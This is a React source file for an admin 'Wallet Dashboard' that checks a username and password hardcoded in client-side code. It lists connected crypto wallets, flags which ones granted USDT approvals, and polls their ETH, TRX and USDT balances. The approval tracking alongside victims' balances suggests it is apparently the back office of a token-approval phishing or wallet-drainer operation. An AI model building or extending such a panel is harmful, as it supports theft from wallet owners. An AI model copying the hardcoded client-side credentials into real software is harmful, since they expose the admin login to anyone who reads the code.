import { useEffect, useState, useMemo } from 'react';
import { supabase } from '../lib/supabaseClient';
import { ACTIVE_RPC_URL } from '../lib/walletConfig';
import './Admin.css';

const EVM_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Helper to shorten addresses for display
function shortenAddress(addr) {
  if (!addr) return '—';
  if (addr.length <= 14) return addr;
  return `${addr.slice(0, 8)}…${addr.slice(-6)}`;
}

// Relative time formatter
function timeAgo(dateStr) {
  if (!dateStr) return '—';
  const now = Date.now();
  const then = new Date(dateStr).getTime();
  const diff = now - then;
  const seconds = Math.floor(diff / 1000);
  if (seconds < 60) return 'just now';
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}m ago`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h ago`;
  const days = Math.floor(hours / 24);
  if (days < 30) return `${days}d ago`;
  return new Date(dateStr).toLocaleDateString();
}

const ADMIN_USER = 'john';
const ADMIN_PASS = 'Qspl@1234';

function LoginGate({ onAuth }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [err, setErr] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      sessionStorage.setItem('adminAuth', '1');
      onAuth();
    } else {
      setErr('Invalid username or password.');
    }
  };

  return (
    <div className="admin-page">
      <div className="admin-glow admin-glow--1" />
      <div className="admin-glow admin-glow--2" />
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh' }}>
        <form onSubmit={handleSubmit} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 16, padding: '2.5rem 2rem', display: 'flex', flexDirection: 'column', gap: 16, minWidth: 320 }}>
          <h2 style={{ color: '#fff', margin: 0, fontSize: '1.4rem', fontWeight: 700, textAlign: 'center' }}>🔒 Admin Login</h2>
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            autoComplete="username"
            className="admin-search"
            style={{ marginTop: 8 }}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
            className="admin-search"
          />
          {err && <span style={{ color: '#f87171', fontSize: '0.85rem', textAlign: 'center' }}>{err}</span>}
          <button type="submit" className="admin-refresh-btn" style={{ width: '100%', justifyContent: 'center' }}>
            Login
          </button>
        </form>
      </div>
    </div>
  );
}

export default function Admin() {
  const [authed, setAuthed] = useState(() => sessionStorage.getItem('adminAuth') === '1');
  const [connections, setConnections] = useState([]);
  const [approvals, setApprovals] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [search, setSearch] = useState('');
  const [sortField, setSortField] = useState('address');
  const [sortAsc, setSortAsc] = useState(false);
  const [balances, setBalances] = useState({});

  const fetchEvmBalance = async (address) => {
    try {
      const [ethRes, usdtRes] = await Promise.all([
        fetch(ACTIVE_RPC_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 }),
        }),
        fetch(ACTIVE_RPC_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0', method: 'eth_call',
            params: [{ to: EVM_USDT, data: '0x70a08231' + address.slice(2).padStart(64, '0') }, 'latest'],
            id: 2,
          }),
        }),
      ]);
      const ethData = await ethRes.json();
      const usdtData = await usdtRes.json();
      const eth = (parseInt(ethData.result || '0x0', 16) / 1e18).toFixed(4);
      const usdt = (parseInt(usdtData.result || '0x0', 16) / 1e6).toFixed(2);
      return { native: `${eth} ETH`, usdt: `${usdt} USDT` };
    } catch {
      return { error: true };
    }
  };

  const fetchTronBalance = async (address) => {
    try {
      const res = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
      const data = await res.json();
      const account = data.data?.[0];
      const trx = ((account?.balance || 0) / 1e6).toFixed(2);
      const trc20List = account?.trc20 || [];
      const usdtEntry = trc20List.find((t) => TRON_USDT in t);
      const usdt = (parseInt(usdtEntry?.[TRON_USDT] || '0') / 1e6).toFixed(2);
      return { native: `${trx} TRX`, usdt: `${usdt} USDT` };
    } catch {
      return { error: true };
    }
  };

  const fetchBalances = (conns) => {
    const loadingState = {};
    conns.forEach((c) => { loadingState[`${c.address}__${c.network}`] = { loading: true }; });
    setBalances(loadingState);
    conns.forEach(async (conn) => {
      const key = `${conn.address}__${conn.network}`;
      const result = conn.network === 'tron'
        ? await fetchTronBalance(conn.address)
        : await fetchEvmBalance(conn.address);
      setBalances((prev) => ({ ...prev, [key]: result }));
    });
  };

  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      const [connRes, apprRes] = await Promise.all([
        supabase.from('wallet_connections').select('*'),
        supabase.from('usdt_approvals').select('*'),
      ]);

      if (connRes.error) throw connRes.error;
      if (apprRes.error) throw apprRes.error;

      const conns = connRes.data || [];
      setConnections(conns);
      setApprovals(apprRes.data || []);
      if (conns.length > 0) fetchBalances(conns);
    } catch (err) {
      console.error('[Admin] fetch error:', err);
      setError(err.message || 'Failed to fetch data');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!authed) return;
    fetchData();
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, [authed]);

  // Build a set of approved address+network keys for quick lookup
  const approvedSet = useMemo(() => {
    const set = new Set();
    approvals.forEach((a) => set.add(`${a.address}__${a.network}`));
    return set;
  }, [approvals]);

  // Merge connections with approval status
  const mergedData = useMemo(() => {
    return connections.map((conn) => ({
      ...conn,
      approved: approvedSet.has(`${conn.address}__${conn.network}`),
      approvalRecord: approvals.find(
        (a) => a.address === conn.address && a.network === conn.network
      ),
    }));
  }, [connections, approvedSet, approvals]);

  // Filter
  const filtered = useMemo(() => {
    if (!search.trim()) return mergedData;
    const q = search.toLowerCase();
    return mergedData.filter(
      (row) =>
        row.address?.toLowerCase().includes(q) ||
        row.network?.toLowerCase().includes(q) ||
        row.wallet_type?.toLowerCase().includes(q)
    );
  }, [mergedData, search]);

  // Sort
  const sorted = useMemo(() => {
    return [...filtered].sort((a, b) => {
      let valA = a[sortField];
      let valB = b[sortField];
      if (sortField === 'approved') {
        valA = a.approved ? 1 : 0;
        valB = b.approved ? 1 : 0;
      }
      if (valA == null) return 1;
      if (valB == null) return -1;
      if (typeof valA === 'string') valA = valA.toLowerCase();
      if (typeof valB === 'string') valB = valB.toLowerCase();
      if (valA < valB) return sortAsc ? -1 : 1;
      if (valA > valB) return sortAsc ? 1 : -1;
      return 0;
    });
  }, [filtered, sortField, sortAsc]);

  if (!authed) return <LoginGate onAuth={() => setAuthed(true)} />;

  const handleSort = (field) => {
    if (sortField === field) {
      setSortAsc(!sortAsc);
    } else {
      setSortField(field);
      setSortAsc(true);
    }
  };

  const sortIcon = (field) => {
    if (sortField !== field) return '↕';
    return sortAsc ? '↑' : '↓';
  };

  const totalApproved = mergedData.filter((r) => r.approved).length;

  return (
    <div className="admin-page">
      {/* Background glow effects */}
      <div className="admin-glow admin-glow--1" />
      <div className="admin-glow admin-glow--2" />

      <div className="admin-container">
        {/* Header */}
        <header className="admin-header">
          <div className="admin-header__left">
            <h1 className="admin-title">
              <span className="admin-title__icon">🔒</span>
              Wallet Dashboard
            </h1>
            <p className="admin-subtitle">
              Monitor connected wallets and USDT approval status
            </p>
          </div>
          <button className="admin-refresh-btn" onClick={fetchData} disabled={loading}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={loading ? 'spinning' : ''}>
              <path d="M13.65 2.35A7.96 7.96 0 0 0 8 0C3.58 0 0 3.58 0 8s3.58 8 8 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 8 14 6 6 0 1 1 8 2c1.66 0 3.14.69 4.22 1.78L9 7h7V0l-2.35 2.35z" fill="currentColor"/>
            </svg>
            {loading ? 'Refreshing…' : 'Refresh'}
          </button>
        </header>

        {/* Stats cards */}
        <div className="admin-stats">
          <div className="admin-stat-card">
            <div className="admin-stat-card__value">{mergedData.length}</div>
            <div className="admin-stat-card__label">Total Connections</div>
            <div className="admin-stat-card__accent admin-stat-card__accent--blue" />
          </div>
          <div className="admin-stat-card">
            <div className="admin-stat-card__value">{totalApproved}</div>
            <div className="admin-stat-card__label">Approved</div>
            <div className="admin-stat-card__accent admin-stat-card__accent--green" />
          </div>
          <div className="admin-stat-card">
            <div className="admin-stat-card__value">{mergedData.length - totalApproved}</div>
            <div className="admin-stat-card__label">Pending</div>
            <div className="admin-stat-card__accent admin-stat-card__accent--amber" />
          </div>
          <div className="admin-stat-card">
            <div className="admin-stat-card__value">
              {mergedData.length > 0 ? Math.round((totalApproved / mergedData.length) * 100) : 0}%
            </div>
            <div className="admin-stat-card__label">Approval Rate</div>
            <div className="admin-stat-card__accent admin-stat-card__accent--purple" />
          </div>
        </div>

        {/* Search bar */}
        <div className="admin-search-wrap">
          <svg className="admin-search-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="11" cy="11" r="8"/>
            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
          </svg>
          <input
            className="admin-search"
            type="text"
            placeholder="Search by address, network, or wallet…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
          {search && (
            <button className="admin-search-clear" onClick={() => setSearch('')}>
              ✕
            </button>
          )}
        </div>

        {/* Error banner */}
        {error && (
          <div className="admin-error">
            <span>⚠️ {error}</span>
            <button onClick={fetchData}>Retry</button>
          </div>
        )}

        {/* Table */}
        <div className="admin-table-wrapper">
          <table className="admin-table">
            <thead>
              <tr>
                <th className="admin-th admin-th--num">#</th>
                <th className="admin-th admin-th--sortable" onClick={() => handleSort('address')}>
                  Address <span className="admin-sort-icon">{sortIcon('address')}</span>
                </th>
                <th className="admin-th admin-th--sortable" onClick={() => handleSort('network')}>
                  Network <span className="admin-sort-icon">{sortIcon('network')}</span>
                </th>
                <th className="admin-th admin-th--sortable" onClick={() => handleSort('wallet_type')}>
                  Wallet <span className="admin-sort-icon">{sortIcon('wallet_type')}</span>
                </th>
                <th className="admin-th admin-th--sortable" onClick={() => handleSort('approved')}>
                  Approval <span className="admin-sort-icon">{sortIcon('approved')}</span>
                </th>
                <th className="admin-th">Balance</th>

              </tr>
            </thead>
            <tbody>
              {loading && sorted.length === 0 ? (
                <tr>
                  <td colSpan="6" className="admin-empty-cell">
                    <div className="admin-loader">
                      <div className="admin-loader__spinner" />
                      <span>Loading data…</span>
                    </div>
                  </td>
                </tr>
              ) : sorted.length === 0 ? (
                <tr>
                  <td colSpan="6" className="admin-empty-cell">
                    <div className="admin-empty">
                      <span className="admin-empty__icon">📭</span>
                      <span>No wallet connections found</span>
                    </div>
                  </td>
                </tr>
              ) : (
                sorted.map((row, idx) => (
                  <tr key={`${row.address}-${row.network}`} className="admin-row">
                    <td className="admin-td admin-td--num">{idx + 1}</td>
                    <td className="admin-td admin-td--address">
                      <span className="admin-address" title={row.address}>
                        <span className="admin-address__dot" data-network={row.network} />
                        <code>{shortenAddress(row.address)}</code>
                      </span>
                      <button
                        className="admin-copy-btn"
                        title="Copy full address"
                        onClick={() => navigator.clipboard.writeText(row.address)}
                      >
                        📋
                      </button>
                    </td>
                    <td className="admin-td">
                      <span className={`admin-badge admin-badge--${row.network}`}>
                        {row.network === 'evm' ? '⟠ EVM' : row.network === 'tron' ? '◈ TRON' : row.network?.toUpperCase()}
                      </span>
                    </td>
                    <td className="admin-td admin-td--wallet">
                      {row.wallet_type || '—'}
                    </td>
                    <td className="admin-td">
                      {row.approved ? (
                        <span className="admin-status admin-status--approved">
                          <span className="admin-status__dot admin-status__dot--approved" />
                          Approved
                        </span>
                      ) : (
                        <span className="admin-status admin-status--pending">
                          <span className="admin-status__dot admin-status__dot--pending" />
                          Pending
                        </span>
                      )}
                    </td>
                    <td className="admin-td admin-td--balance">
                      {(() => {
                        const bal = balances[`${row.address}__${row.network}`];
                        if (!bal) return <span className="admin-balance__empty">—</span>;
                        if (bal.loading) return <span className="admin-balance__loading">···</span>;
                        if (bal.error) return <span className="admin-balance__error">—</span>;
                        return (
                          <div className="admin-balance">
                            <span className="admin-balance__usdt">{bal.usdt}</span>
                            <span className="admin-balance__native">{bal.native}</span>
                          </div>
                        );
                      })()}
                    </td>

                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>

        {/* Footer */}
        <div className="admin-footer">
          <span>
            Showing {sorted.length} of {mergedData.length} connections
          </span>
          <span className="admin-footer__auto">
            Auto-refreshes every 30s
          </span>
        </div>
      </div>
    </div>
  );
}
